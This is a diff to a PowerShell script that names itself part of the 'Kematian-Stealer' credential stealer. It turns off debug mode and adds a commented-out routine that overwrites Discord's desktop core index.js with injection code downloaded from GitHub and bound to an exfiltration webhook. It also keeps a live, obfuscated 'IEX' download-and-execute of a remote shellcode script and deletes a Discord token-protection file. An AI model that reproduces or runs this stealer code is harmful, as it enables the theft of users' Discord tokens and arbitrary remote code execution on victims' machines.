@@ -1,4 +1,4 @@
-$debug = $true
+$debug = $false
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -888,6 +888,32 @@ function Backup-Data {
         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
     }
 
+
+#    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
+#    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
+#
+#    foreach ($path in $discPaths) {
+#        $skibidipath = Join-Path $locAppData $path
+#        if (-not (Test-Path $skibidipath)) {
+#            continue
+#        }
+#        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
+#            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match [System.IO.Path]::GetFileName($_.FullName) -and $_.FullName -match "discord_desktop_core") -or ($_.FullName -match [System.IO.Path]::GetDirectoryName($_.FullName) -and $_.FullName -match "discord_desktop_core")) {
+#                $files = Get-ChildItem $_.FullName
+#                foreach ($file in $files) {
+#                    if ($file.Name -eq "index.js") {
+#                        $webClient = New-Object System.Net.WebClient
+#                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
+#                        if ($content -ne "") {
+#                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
+#                            $replacedContent | Set-Content -Path $file.FullName -Force
+#                        }
+#                    }
+#                }
+#            }
+#        }
+#    }
+
     #try {
     #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
     #}
@@ -899,7 +925,7 @@ function Backup-Data {
     Write-Host "[!] Injecting Shellcode !"
     $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
-    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput ($PSCommandPath + ":stdout")
+    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
     Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green
 
